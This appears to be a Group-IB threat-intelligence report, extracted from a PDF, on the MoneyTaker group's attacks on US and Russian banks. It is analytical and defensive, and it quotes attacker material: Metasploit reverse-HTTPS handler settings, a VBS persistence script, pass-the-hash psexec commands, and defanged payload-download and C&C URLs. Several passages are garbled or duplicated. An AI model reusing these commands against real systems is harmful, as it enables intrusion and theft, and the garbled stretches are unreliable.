1MoneyTaker1.5 YEARS OF SILENT OPERATIONSDecember 2017www.group-ib.com2TABLE OF CONTENTSSummaryAttack infrastructureProvision of the malware survivabilityPropagation across the networkSpying on legitimate usersAttack on AWS CBRPotential attacks on SWIFTAttack on card processingUsing banking TrojansUsing POS TrojansRecommendationsIndicators of compromise3711121519252627282931SUMMARY 01From May 2016 to November 2017, at least 20 organisations were attacked in the United States, UK and Russia. At least one of the US banks was successfully robbed twice. In addition to money, attackers stole documentation related to the interbank payment systems, which appear to have been obtained to prepare further attacks. Based on analysis of these incidents, attack tools and the tactics applied, we have concluded that the same group, which Group-IB has dubbed MoneyTaker (after the malware used) is behind these attacks. It is interesting to note that despite the effectiveness of the attacks, they have gone completely unreported till now.3Targets •In total Group-IB has confirmed at least 20 companies as victims of the MoneyTaker group, 16 of which are located in the US. The vast majority of them are small community banks, where hackers attacked card processing systems. The average damage from each successful attack was 500,000 USD baseline.• Criminals stole documentation for OceanSystems’ FedLinkcard processing system, which is used by 200 banks in Latin America and the US. We believe that banks operating on this infrastructure are at risk of being amongst the next targets of MoneyTaker group.•In Russia, they focus on attacks on the system of interbank transfers AWS CBR (Russian Interbank payment system). The average amount of damage caused by this theft scheme is 1.2 million USD per incident. That said, the affected banks managed to return some portion of the stolen money.Tools and tactics Attackers use both borrowed and their own self-written tools. When attacking, hackers act creatively and wisely: they use «one- time» infrastructure and carefully erase traces of their activity post-incident.Infiltration• To penetrate the corporate network, the group uses legitimatepen testing tools - Metasploit and PowerShell Empire.• After successful infection, they carefully erase malwaretraces. However, when investigating one of the incidents, we managed to discover the initial point of compromise: hackers penetrated the bank’s internal network by gaining access to the home computer of the bank’s system administrator.Stealthy techniques• The group uses ‘fileless’ malware which only exists in RAMand is removed on rebooting.4• To protect C&C communications from being detected bysecurity teams, hackers employ SSL certificates generated using names of well-known brands: Bank of America, Federal Reserve Bank, Microsoft, Yahoo, etc.• Servers used to perform initial infection are one-timecomponents which are changed immediately after a successful infection.Attack toolsMembers of the group are skilled enough to promptly adjust the tools applied. In some cases, they made changes to the source code ‘on the fly’ - during the attack.Created toolsBorrowed toolsMoneyTaker 5.0 - malicious program for auto replacement of payment data in AWS CBR‘Screenshotter’ and ‘keylogger’ to conduct espionage and capture keystrokesMetasploit and PowerShell EmpirePrivilege escalation tools, whose code were demonstrated as a Proof of Concept at ZeroNights cybersecurity conference in Moscow in 2016. More data provided later in this reportMoneytaker ‘Auto-replacement’ program to substitute payment details in the interbank transfer systemCitadel and Kronos Banking Trojans. The latter one was used to deliver a Point-of-Sale (POS) malware dubbed ScanPOSTracking the attacks • Servers used to conduct the attacks were specificallyconfigured to deliver the malicious payload to a pre- determined list of IP addresses belonging to the target company. This methodology was employed by attackers to prevent the payload from falling into the hands of security analysts and experts.• After each round of attacks, hackers deploy new infrastructurefor network persistence.•In detected incidents, criminals used a program that should have carefully removed all components of the programs applied. However, due to an error made by the developer, the data were not deleted from the attacked machines, which enabled forensic experts to learn details of the hackers’ activity.5Interrelations between incidents In 1.5 years, Group-IB confirmed 20 incidents in total. Initially we divided these incidents into three groups and considered them as separate. However, through in-depth investigation of the infrastructure, tools, and tactics applied, which will be further covered in this report, we have concluded that one group is behind all these attacks – MoneyTaker. This is supported by technical analysis provided later in this report:Group 1Group 2Group 317 incidents in US and UK organizations. In the majority of instances, hackers used the same C&C server to control the initial part of their attacks. In some cases, we saw a similar use of the infrastructure from which remote connections were performed using LogMeIn.Common features of Groups 1-32 incidents occurred in Russia in the autumn of 2016. The two attacks occurred at the same time; in both cases Meterpreter was used to attack the same target – servers of the Russian interbank transfer system (AWS CBR).1 incident in Russia in the autumn of 2017. The attack was conducted on the AWS CBR using Meterpreter.• Metasploit used to infiltrate corporate networks • SSL certificates generated using popular brands to protect traffic between Meterpreter and C&C • Russian-speaking attackers • Own developers who create unique tools • Modification of the malicious code during attack • Covering tracks of the initial infection vector • Setting up forwarding corporate emails to Yandex and Mail.ru, free mail services.Common features of Groups 2 and 3 • Originally targeted AWS CBR in Russia • Using domains in the .ga zone • Similar manner of propagation across the network. was available back in 2013. The current version of this remote provider, UKUS Financial Services Provider (Breach not confirmed)Bank, RussiaBank,Russia AWS CBR2016Bank, USA First Data STARJANUARYFEBRUARYMARCHAPRILMAYJUNEJULYAUGUSTSEPTEMBEROCTOBERNOVEMBERDECEMBERBank, USA, UTBank, USA, NYBank, USA, VABank, USA, COBank, USA, FLBank, USA, SCCredit Union, USA2017Bank, USA, ILBank, USA, ILBank, USA, WIBank, USA, OKBank, Russia AWS CBRJANUARYFEBRUARYMARCHAPRILMAYJUNEJULYAUGUSTSEPTEMBEROCTOBERNOVEMBERDECEMBERBank, USA, MOBank, USA, CALaw Firm, USA, NCBank, USA, CATimeline of initial infections in attacks: • The very first attack, which Group-IB attributes to MoneyTaker was conducted in the spring of 2016, when funds were stolen from a US bank by gaining access to First Data’s STAR card processing system.•••In September 2016, Group-IB tracked several attacks on banks in Russia. The main target was the AWS CBR (Automated Work Station Client of the Russian Central Bank), a Russian interbank fund transfer system similar to SWIFT. After a successful theft from one of the attacked banks, the incidents stopped, similar to the case of theft in the United States.In November 2016, attackers deployed new infrastructure, which was then used to attack banks in the United States. The last activity in this wave of attacks was tracked in June 2017.In November 2017, we observed a new successful attack by this group in Russia. Like in 2016, they managed to steal funds through the interbank transfers system.702ATTACK INFRASTRUCTURETo conduct targeted attacks, hackers use a distributed infrastructure that is difficult to track.A rather unique feature of the infrastructure is the presence of a Persistence server, which delivers the payload only to real victims whose IP addresses are added to the whitelist.12345Stager request payloadPayloadSetup encrypted tunnel with backconnectRequest stager after rebootResponse with stager if IP in whitelistPentest framework and backconnectserverPersistence server(response to whitelisted IPs)VICTIMPentest framework server This server is used to perform the main activity. On it, hackers install a legitimate tool for penetration testing - Metasploit to further control the full attack.8Nameasys.exelaunch-paranoid- initiates outbound SSL connections which helps to avoid detection of suspicious connections by network security systems. Below is code executed within the Metasploit console by the attacker:use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse _ https set LHOST _ c2serverIP _ set LPORT 443 set HandlerSSLCert /root/.msf4/loot/20161031010327 _ set StagerVerifySSLCert true set EnableStageEncoding true set StageEncoder x86/shikata _ ga _ nai set ExitOnSession falseBy default, Metasploit generates self-signed SSL certificates and specifies random values in the following fields: Valid from, Valid till, Common name. Such certificates can also cause suspicion.9In order to avoid detection, the MoneyTaker group generates self- signed SSL certificates before the attack, indicating the names of popular brands in the fields, instead of filling them out randomly.Group-IB specialists have discovered the use of the following Hackers try to stay as inconspicuous as possible, and therefore they use ‘fileless’ malware which only exists in RAM and is destroyed after reboot.That said, PowerShell and VBS scripts help them to ensure persistence in the system.Scripts provide the following benefits for attackers:• Malicious scripts are hard to detect by means of antivirusprotection. Writing a signature for a script without false positives is much more difficult than a binary file.• Scripts are easy to modify, which makes it easier for attackersto work.•It is easy to ensure persistence. Typically, such scripts are stored in the registry or are called when certain events occur through Windows Management Instrumentation (WMI), Group Policy Objects (GPOs), Scheduled task. Such scripts are very simple and usually their main task is to download the main program from an external or local source and run it.10The Persistence server is used to force a malicious file to be launched if the attacked computer has been rebooted. A distinctive feature of this group is the use of a separate server for this goal.On the server, they run a script that performs two checks:1. Checks if the User-agent field is equal to WinHttp. If it is not equal, requests are sent back to the web server with a 404 error code (page not found). If equal to WinHttp, it performs the second check.2. Checks if the IP address from which the request is made is on the white list. If yes, then the malicious file mencstager.exe is delivered. If not, rundll32.exe is transferred. 51138beea3e2c21e c44d0932c71762a8 – a legitimate Windows file.This verification complicates investigative activity of researchers who cannot get the malicious file because they try to download it from an IP address that is not on the white list.11PROVISION OF THE MALWARE SURVIVABILITY03Unlike other groups conducting targeted attacks, MoneyTaker uses standard techniques to provide malware survivability in the system.Researchers have not managed to recover the full picture of the incidents that occurred in the autumn of 2016 in Russia, because tracks of successful attacks were carefully removed. However, Group-IB has discovered that hackers infiltrated the network of a Russian bank by gaining access to the home computer of the bank’s system administrator. One of the methods to ensure malware survivability in the system was the creation of services using .bat scripts that launched the VNC server.The contents of the at1.bat file:«c:\Program Files\Cisco Systems\VPN Client\hostsec32.exe» -install «Host Security Server»The contents of the at2.bat file:«c:\Program Files\Cisco Systems\VPN Client\hostsec32.exe» -uninstall «host security server»These batch files were called from Windows Task Scheduler.In US incidents, the attacker used VBS scripts that created a link named «Task Scheduler» for a specific user in the startup to launch the malicious file.Set oWS = WScript.CreateObject(«WScript.Shell») sLinkFile = «C:\Users\<%username%>\AppData\Roaming\Microsoft\ Windows\Start Menu\Programs\Startup\taskhost.lnk» Set oLink = oWS.CreateShortcut(sLinkFile) oLink.TargetPath = «C:\Users\<%username%>\AppData\Local\ Temp\taskhost.exe» ‘ oLink.Arguments = «» ‘ oLink.Description = «Task Scheduler» ‘ oLink.HotKey = «ALT+CTRL+F» ‘ oLink.IconLocation = «C:\Users\<%username%>\AppData\Local\ Temp\taskhost.exe, 2» ‘ oLink.WindowStyle = «1» ‘ oLink.WorkingDirectory = «C:\Users\<%username%>\AppData\ Local\Temp» oLink.Save1204PROPAGATION ACROSS THE NETWORKAfter successfully infecting one of the computers and gaining initial access to the system, the attacker performs reconnaissance of the local network in order to gain domain administrator privileges and eventually consolidate control over the network.Hackers use the Metasploit tool to conduct network reconnaissance, search for vulnerable applications, exploit vulnerabilities, escalate systems privileges, and collect information.Gaining admin privileges To escalate privileges up to the local administrator (or “SYSTEM” local user), attackers use exploit modules from the standard Metasploit pack, or exploits designed to bypass the UAC technology. With local administrator privileges they can use the Mimikatz program, which is loaded into the memory using Meterpreter, to extract unencrypted Windows credentials.In addition to the standard modules from the Metasploit pack, the was compiled on October 23, 2016 based on codes presented at the Russian conference ZeroNights 2016. The codes are available online at url lives.13In addition, they actively searched for passwords stored in Active Directory group policies by exploiting the MS14-025 vulnerability and the corresponding Metasploit module (post/windows/gather/ credentials/gpp).After receiving group policy files, the attacker decrypted the passwords that were stored there and used them on other workstations. In some cases, passwords of bank systems’ accounts granting local administrator privileges were very weak. Here is an example of domain administrator passwords that attackers recovered:User nameEncrypted value of the password fieldDecrypted passwordAdministratorUj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KYWrongpassword1Administratorn8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzISystem321Using the Metasploit modules with the functionality of dumping Windows local users’ password hashes stored in the Security Accounts Manager (hashdump or smart_hashdump modules), hackers received the local administrator’s NTLM hash, as well as the NTLM hash and unencrypted password for domain users.Propagation across the network To get the list of computers in Active Directory, hackers often use a PowerShell script named allpc.ps1, which was copied from this discussion in October 2015:url computers-in-multiple-ous-in-adTo propagate across the network, hackers used a legitimate tool psexec, which is typical for network administrators. This tool creates a local service via SMB/RPC protocol, then executes and deletes it. In the service properties, the required command is set to start. The attacker used two methods to distribute the payload: they placed executable files in the network folder, and forced the attacked computers to start them, or indicated the shell code directly in the service start line.For passwords that were received as an NTLM hash and were not decrypted, the Pass-the-hash technique was used, which allows using an NTLM hash for authentication without password. To do this, the same legitimate Metasploit’s psexec modules were used without any modification.14use auxiliary/admin/smb/psexec _ command set SMBUser Administrator adf1794f475c23cd set SMBDomain WORKGROUPAfter gaining access to new systems, attackers repeated the above-mentioned procedure to collect passwords.Remote access Until October 2017, hackers remotely accessed systems of interest using standard Metasploit tools, as well as legitimate remote access programs.On hosts where Meterpreter was launched, hackers set up a SOCKS proxy server, which allowed them to remotely send commands within the local network. To create a connection via SOCKS proxy, they primarily used ports 7080 and 1808:use auxiliary/server/socks4a show options set SRVHOST _ c2serverIP _ set SRVPORT 7080In addition, they actively used various VNC clients such as Fileless VNC, VNC, UltraVNC and TightVNC Portable versions x32 and x64.In the US, they used the LogMeIn Hamachi solution for remote access.In one incident, to ensure continuous remote access, hackers gained access to the firewall, where they configured a tunnel to the C&C server.Also, to secure connections to its C&C server, hackers established an SSH tunnel using a legitimate tool - Plink.1505SPYING ON LEGITIMATE USERSTo conduct a successful attack, hackers need to monitor legitimate activity of the victim bank’s users and financial operators to then repeat the same actions.The MoneyTaker group uses the following tools to spy on employees:• A legitimate tool NirCmd• Self-developed tools - ‘screenshotter’ and ‘keylogger’NirCmd is a small command-line utility, with the functionality similar to psexec. It allows hackers to remotely execute various commands: write and delete values and keys in the Registry, write values into INI file, connect to a VPN network, restart windows or shut down the computer, change the created/modified date of a file, change display settings, turn off the monitor, and many more.One of the most important capabilities for attackers is taking screenshots. For example, by running the following command:nircmd.exe loop 10 60000 savescreenshot c:\temp\ scr~$currdate.MM _ dd _ yyyy$-~$currtime.HH _ mm _ ss$.png10 screenshots will be taken with an interval of 60 seconds.However, this functionality was not enough for the group, therefore they created their own unique tools designed to take 36a90375ddKeylogger/Screenshotter16These programs are designed to capture keystrokes, take screenshots of the user’s desktop and get the contents from the clipboard. All this data can be stored in a file of the temporary directory.Dropper This is an NSIS-packed downloader. Upon its launch it creates the following files:%Temp%\datepicker-ru _ RU.js %Temp%\LEJ%2BPamplona%2BSanta.jpg %Temp%\roknewsflash.css %Temp%\fonts.css %Temp%\addons.css %Temp%\tracker.php %Temp%\mJ8OS5lCf8xFQQiX4F1Ei.sNXbnF1xay %Temp%\<rnd _ chars>.tmp\System.dllThe dropper twice launches its own file as a child process.It decrypts the data buffer, which is stored in the dropper in an encrypted form, and injects it into the child process (which is launched last). That is how the payload is started.Keylogger/Screenshotter • The application is compiled in Delphi. Its main form containstext field components and 5 timers.• Based on the names of components in Portuguese, we assume that either its author is Portuguese-speaking, or the campaign targets Portuguese-speaking countries (for example, Brazil) or the code is based on the source code of the Portuguese program.• Functions of the application are executed once the timertriggers (after the time interval, which is specified in this timer as the interval of the timer operation).17Timer nameFunctionStatus at the time of launchTimer's triggering intervalActivity of the triggered timerInternetTimerTimer activating AtivatTimerenabled10 secondsTriggers the activation timerKeyloggerTimerKeylogger timerdisabled1 millisecondEnviarTimerData export timerdisabled5 minutesAtivatTimerActivation timerdisabled1 millisecondDesativatTimerDeactivation timerdisabled1 millisecondActivates the functions of the keylogger. Described in detail below.Takes screenshots, dumps all the collected data into a file. Will be described belowTriggers the keylogger timer and the data export timer; disables the activation timer (itself)Triggers the keylogger timer, and the data export timer; disables the deactivation timer (itself)• Timers’ names mean that one of them is used to activatenetwork functions (InternetTimer), another one is used to send data (EnviarTimer). However, in fact they perform other activity. Instead of activating the network functions, the «InternetTimer» timer simply activates another timer, and the «EnviarTimer» timer (translated as «sending timer») captures screenshots and uploads the collected data to a file in a temporary directory. This may indicate that the source code of the file, which was originally written for other purposes (including sending network data), was then slightly modified.• After the start, the application executes the TForm1.FormCreate() procedure, where it loads the necessary system dynamic libraries into the address space and looks for the addresses of the functions WinExec, GetAsyncKeyState, GetWindowTextA, GetForegroundWindow KeyloggerTimer in them. When the timer triggers, it intercepts keystrokes. It also extracts the name of the application (the window title) in which the key was pressed and the date / time of pressing. Below is an example of a record of the keylogger log. Bold marked are pressed keys or dialog box titles in which these keys were entered[F2][F9]</textarea><br><br><b><font color = «green»>[ Run - 2:53:54 - 11.11.2017 ] <br></b></font><style>textarea {width:100%; height:7em;}</style><textarea readonly>some _ entered _ word</textarea><br><br><b><font color = «green»>[ OllyDbg - 1.exe - [CPU - main thread, module 1] - 2:54:25 - 11.11.2017 ] <br></b></font><style>textarea {width:100%; height:7em;}</style><textarea readonly>18• The keylogger records the results of the interception to theTForm1.Memo1 object located on the application’s main form. From here data can be obtained for further recording to a file in a temporary directory.• EnviaTimer. Using the API function GetClipboardData () it canintercept the contents of the clipboard• The anti-emulation function is implemented in the timer code to bypass antivirus and automated sample analysis by calling the ValidateName () function. Purportedly, this method of anti-emulation was copied from a public Russian speaking source (the forum url php?p=109096&postcount=63) and was implemented with an error, due to which the functions of taking screenshots and writing data to a file (which is located in code after checking for emulation) may not be executed.•It takes a screenshot of the desktop, compresses it into JPEG and encodes in base64•It creates a file with the name “%Temp%\perflog1.tmp”Example of the contents of the “%Temp%\ perflog1.tmp” file collected by keylogger and screenshotter• Network communications used to send collected data havenot been detected in the analyzed file.1906ATTACK ON AWS CBRIn August 2016 hackers successfully infiltrated the network of a Russian bank. They used an automated system to steal money through the AWS CBR (Automated Work Station Client of the Russian Central Bank), an interbank fund transfer system.Namemain.exe igfxserv.exexml.exeed.exetxt.exeMD5TypeD57608F6DB9045752165EAF93452D57FMain moduleA70F905266F3D57B73B1D8A265286FD5Module used to substitute payment messages92B03E123B2D97B8E8E274224273EC5EModule used to hide fraudulent transfersModule used to work with temporary filesarsm32.exeA70F905266F3D57B73B1D8A265286FD5UltraVNChostsec64.exe92B03E123B2D97B8E8E274224273EC5EVNC clienthostsec32.exeVNC clientempty32.exeA70F905266F3D57B73B1D8A265286FD5VNC client1E4499560CDD2F69ECBED8761CAC7272 8B1B5D1C8430EC16735E5DED94112B18Meterpreter downloaded a modular tool called Moneytaker v5.0 to the server of the AWS CBR. This is the tool which the group has been named after.Its main module is located in the directory “c:\intel\logs\1\mt\bin” and has the name “main.exe” or “igfxserv.exe”. This is a program without network communications and it should run with the main configuration file specified as an argument. It is initialized according to the configuration file, then it checks the presence of the modules specified in the configuration file and backups of certain AWS CBR directories.Further through the report, in the behavior description which depends on the configuration file, the name of the argument will be specified.MAIN MODULE – “MAIN.EXE” OR “IGFXSERV.EXE” The main module is started by passing the main configuration file “c:\intel\logs\1\mt\config\main-config.txt” as an argument. The module logs all events to the “Main-Logfile” file. Upon startup, the module looks for XML, ED and TXT modules specified in the config file as “XmlBin” “EdBin” and “TxtBin”, respectively. They also search for their configuration files, the parameters: “XmlCfg” “EdCfg” and “TxtCfg”. If configuration files of modules do not exist as separate files, their settings are stored together in the “main- config.txt” file.The module reads the “Directory” “Backup” “Recursive” “Action” parameters and uses the WINAPI function called ReadDirectoryChangesW() to monitor the files appearing in the directories specified in the “Directory”.Directory nameDesignation in AWS CBR%АРМ КБР%\exg\chkDecrypted, unpacked and verified electronic messages%АРМ КБР%\exq\cliReceived messages from AWS CBR formed according to the unified formats of electronic messages of the Central Bank of Russia%АРМ КБР%\tmpTemporary filesWhen a new file appears, the corresponding module is started (ED for the “chk” directory, XML for the “cli” directory and TXT for the “tmp” directory) and copied to the directory specified as “Backup”.21AWS CBR operatorED101A legitimate paymentorder issued byAWS CBR operatorXML.EXEsubstitutes originalpayment detailswith fraudulent onesCBR%ARM_CBR%\exg\cli%ARM_CBR%\exg\chkAWS CBRvalidation component (checks the correctness of the payment message)ED.EXErestores original payment detailsAWS CBR operator receives the response as if the payment details were the initial ones, without suspecting the theft.Payment order withthe fraudulent paymentdetails is sent to theCentral Bank of RussiaAUTOMATED REPLACEMENT MODULE – “XML.EXE” The main module starts the “xml.exe” file, passing the name of a new file in the “%АРМ КБР%\exq\cli” directory and the config file.The automated replacement module records detailed logs and writes them to a file specified in the configuration as “Xml-Logfile”Electronic messages generated by the AWS CBR are placed in the “%АРМ КБР%\exq\cli” directory for further processing by the gateway component “Input control”. It is at this point that the module checks the xml file for validity and determines whether the electronic message file is a payment order (the “ED101” type).22For ED101, the module scans for the fields “Purpose”, “Payer”, “PersonalAcc”, “Payee”, “Name”, “Bank BIC”, “CorrespAcc”, “KPP”, “INN”, “SUM”, “AccDocNo”.Then it reads the file with the fraudsters’ payment details - “Xml- Workfile”. The following fields are specified: ”name”, ”id”, ”acc”, “inn”, “kpp”, ”bik”, ”corr”, ”purpose”.If it manages to get all the necessary fields from the payment order and the “Xml-Workfile” file has required details, then the payment order will be modified by substituting original payment details with fraudulent ones. That said, the payment amount does not change, and for each replaced document the attackers have a separate account. The accounts for which the money goes are not repeated.The success of replacement is due to the fact that at this stage the payment order has not yet been signed, which will occur after payment details are replaced.For further operation of another module - ED, after each automated replacement the XML module stores information in the “Xml-Resultfile” file in the following format:# #CONCEALMENT MODULE – ED.EXE The “ed.exe” file is started by the main module passing the name of a new file in the “%АРМ КБР%\exq\chk” directory and the configuration file.• After the payment order is modified, signed and sent, thefollowing activity is performed:•It is transferred to the logical control where the correctness of the electronic payment message is checked, and the compliance of the payment details with reference data is established• The program checks the possibility of payment within theamount of liquid funds in the bank account23• The electronic payment message is accepted for execution; the funds are debited from the payer’s account and credited to the beneficiary’s account• Based on the results of execution, an electronic message ED206 (confirmation of debit) is sent to the address of the issuer.• The message is decrypted, unpacked, passes the verification of the authentication code and security code and is stored in the “%APM KBR%\exq\chk” directory• The main module starts the concealment module passing theincoming electronic message.The ED module checks whether the incoming electronic message is ED206 (debit/credit confirmation following the results of debit transaction) or ED211 (following the results of the day or payment batch).For ED206, the field “CorrAcc” is verified, for ED211 the “PayeePersonalAcc” field is verified. The values of these fields are compared with HackAcc in the “Xml-Resultfile” file (this is the file in which the XML module stores information about replacements).If the values match, then the module restores the original payment details.This means that the payment order is sent and accepted for execution with the fraudulent payment details, and the responses come as if the payment details were the initial ones. This gives cybercriminals extra time to mule funds before the theft is detected.TEMPORARY FILE MODULE – TXT.EXE The main module is also able to start the TXT module by passing the name of the temporary file of the AWS CBR as an argument. However, we have not managed to obtain this module and do not know its function.All MoneyTaker modules do not have information displayed and actively record their activity to log files. There is also the possibility of a test run, which is performed after installation on a computer with AWS CBR. Hackers use it to control the program operation.After this attack, they did not conduct a single new attack on the AWS CBR using this tool.24In November 2017, they again attacked another bank in Russia. Hackers managed to gain access to the servers and workstations of AWS CBR operators, but they were not able to use MoneyTaker malware because the server was in a completely isolated segment.After an unsuccessful attempt to steal money through the system of interbank transfers, they switched their focus to card processing as in the the US based attacks.2507POTENTIAL ATTACKS ON SWIFTThrough analysis of the attackers’ infrastructure, we discovered that they always try to steal internal banking system documentation: administrator guides, internal instructions and regulations, change request forms, transaction logs, etc.We did not find any evidence of successful attacks on SWIFT conducted by this group, nor did we find any connections with already known incidents, for example, in Hong Kong, Ukraine, or Turkey. However, we know that in addition to the abovementioned documents these threat actors search for and copy documents related to SWIFT, which may indicate pending attacks on this system. Now hackers have the following documents at their disposal:•Installation and Administration Guide for SWIFT Alliance Access 7.0• Security Guide for SWIFT Alliance Access 7.0• System Administrator Procedures, for Ocean Systems’ wiretransfer product FedLink• User Procedures Manual, for Ocean Systems’ wire transferproduct FedLinkThe two last mentioned documents are of interest, because they describe how to make transfers through SWIFT using the FedLink system. According to FedLink’s official website, now they have more than 200 customers in the US and Latin America. We assume that banks in Latin America may become the next target of this group.26Figure. Screenshot of the guidelines on card transaction processing via terminalFigure. Fragment on Credit limit increase from the card processing guidelines08ATTACK ON CARD PROCESSINGThe first attack on card processing that we attribute to this group was conducted in May 2016.Having gained access to the bank network, the attackers compromised the workstation of First Data’s STAR network portal operators, making the changes required and withdrawing the money. In January 2017, the attack was repeated in another bank.Focusing on card processing systems enables the attackers to carry out attacks that are easier and safer for ‘money mules’ who provide cash withdrawals. The attackers are in one country, the victim bank is in another and cash is withdrawn by mules in a third locale. This scheme is simple to implement and does not require much investment from attackers. That explains its increased usage by cybercriminal groups such as Moneytaker and Cobalt.The scheme is extremely simple:• After taking control over a bank network, the attackerschecked if they could connect to the card processing system.• They legally opened or bought cards of the bank whose ITsystem they had hacked.• Money mules – criminals who withdraw money from ATMs – with previously activated cards deployed and waited for the operation to begin.• After getting into the card processing system, the attackersremoved or increased cash withdrawal limits for the cards held by the mules.• They removed overdraft limits, which made it possible to gooverdrawn even with debit cards.• Using these cards, the mules withdrew cash from ATMs, oneby one. The average loss caused by one attack was about $500,000 USD.As in the case with the attacks on SWIFT, they gather internal documents from banks in order to get a better understanding of how to handle certain systems.2709USING BANKING TROJANSThrough analysis of the C&C server used to conduct targeted 1f2d223e15c762209), which was downloaded from the server TROJANSThrough analysis of the C&C server used to conduct targeted phishing campaigns, primarily targeting companies in the UK and US. The email messages contained a malicious document, or a phishing link.When the victim opened the attached document, a macro which downloaded Kronos banking Trojan form the URLhxxp://info.docs-sharepoint[.]com/officeup[.]exe.In the investigated case the “203.exe” file was downloaded from the following link:hххp://profile.invoice-sharepoint.com/Emplid/officeup.exe, in the event of opening the file LHarv.xls (de05666412026c6d6c4740b79bc payloads from the following URLs:hxxp://networkupdate[.]online/kbps/upload/c1c06f7d[.]exeSmoke Loaderhxxp://networkupdate[.]online/kbps/upload/1f80ff71[.]exeSmoke Loaderhxxp://networkupdate[.]online/kbps/upload/a8b05325[.]exeScanPOSScanPOS is a unique point-of-sale (PoS) malware. Upon execution, ScanPOS grabs information about the current running processes and collects the user name and privileges on the infected system. That said, it is primarily designed to dump process memory and search for payment card track data. The Trojan checks any collected data using Luhn’s algorithm for validation and then sends it outbound to the C&C server.The C&C address for ScanPOS was hxxp://invoicesharepoint[.]com/ gateway[.]phpRECOMMENDATIONS 1129Run an indicator check-up in the following sectionOperating system security • Prohibit any remote logon to the system (RDP, SMB, RPC) for local administrators. We recommend that you use only Logon type 2 (interactive): url cc787567(v=ws.10).aspx• Configure the following parameter in the registry on all PCsrunning Windows 7 (and up) and all the servers using Windows 2008R2:HKEY _ LOCAL _ MACHINE/SYSTEM/CurrentControlSet/Control/ SecurityProviders/WDigest/UseLogonCredential=0This registry key prohibits storing unencrypted passwords in RAM (which are usually leveraged by Mimikatz)• Prohibit a standard local administrator with an ID=500 (which is vulnerable pass-the-hash attack). Add another administrator and install updates to protect against Pass the hash attacks: url#ID0E3D• Minimize and completely deny granting administratorprivileges for users of local PCs, especially for users who work with external information systems.• Use a different local Administrator account password onevery node, which must not match any domain administration credentials. If this rule is not currently applied – change all the passwords, make them unique, long and complex. Securely manage local Administrator passwords by using specialized tools, such as Microsoft’s Local Administrator Password Solution (LAPS).• Deny granting domain administrator privileges for commonuser accounts. In order to perform domain administrative tasks, create a separate additional domain user account for each administrator, while preventing them from performing daily routine administrator work on their PCs under an account with administrative rights.30•Isolate hosts in the same VLAN, so that one workstation would not be able to gain access to another one on network levels L2/L3, and could access shared network segments (printers, servers, etc.).• Provide timely updates of OS, antivirus software and otherapplications.• Configure the service accounts with the minimum set ofpermissions necessary for them to function properly (with respect to logon type and group membership). Strictly prohibit adding service accounts to the local administrators group unless absolutely necessary.• Use IDS solutions and a sandbox to analyze files. Werecommend that companies apply technology like Group- IB’s TDS Sensor and sandbox, which are able to detect and prevent these types of attacks.Measures to protect interbank transfer system, card processing and ATMs•Isolate hosts of workstations and servers related to the interbank transfer system.• Ensure the integrity of data, system and application software deployed on the infrastructure servers; introduce application whitelisting on workstations.• Ensure monitoring and notifications in case of anomalous time of access to servers and workstations by operators of financial systems.• Ensure monitoring and notifications of changes to overdraftand cash withdrawal limits.31ABOUT GROUP-IBGROUP-IB HELPS MAJOR CORPORATIONS RECOGNIZE AND REACT TO THE MOST SOPHISTICATED CYBER- THREATS.Profound human intelligence and cutting- edge technologyGroup-IB leverages its proprietary high-tech infrastructure to monitor hacker activity and extract unique data. These data is accomplished by profound human intelligence by experts who conduct incident response and monitor the most secretive underground hacker forums.NETWORK INFRASTRUCTURE • HoneyNet and botnet analysis • Hacker community infiltration • Open-source monitoring • Network attack trackers • TDS Sensors • Behavior analysis systemInvestigationsHUMAN INTELLIGENCE • Malware monitoring and research • CERT-GIB request database • Security assessment • Group-IB case studiesGLOBAL DATA EXCHANGE • Computer incident response teams • Domain registrar and hosting providers • Cyber security vendors • Cybersecurity associations & professional organizations• Europol, Interpol and lawenforcement agenciesEUROPOLINTERPOLWORLD and INTERPOL partnerRecommended by theOrganization for Security and Co-operation in Europe (OSCE)Member of the WorldEconomic ForumGroup-IB Threat Intelligence has been recognized by top industryresearcher reportsProducts and services powered by Threat IntelligenceComprehensive ecosystem of threat intelligence and security solutions empowers organizations to identify threats sooner, respond faster, and build more effective defenses against sophisticated cyberattacks.EARLY WARNING SYSTEM • AntipiracyRESPONSE 24/7/365 • Computer EmergencyResponse Team CERT-GIBRESPONSE 24/7/365 • Digital forensics andmalware analysis Incident investigation• • Financial and corporateInvestigation3212INDICATORS ScreenshotterDropper of Keylogger/ ScreenshotterDropper of Keylogger/ igfxserv.exexml.exeed.exe77003E4E6EB091643DFF0C0F967D8C9001DE7D8689E493D67D0F4275 CC189083Main module5F6D1B1728EAE505B23C7FD16E04AD534D44465AFE4C3FD420475CAB2 5B61B02Module which replaces payment data2B365805E50A09B0149FF2E706CB19D7FAC71FC6B1D1273BE8EB3E93875 0C23BModule which replaces / hides fraud transactionstxt.exewas not restoredModule which operates with investigating cybercrime since 2003www.group-ib.com blog.group-ib.cominfo@group-ib.com +44 2036085907twitter.com/groupib_gib linkedin.com/organization/1382013 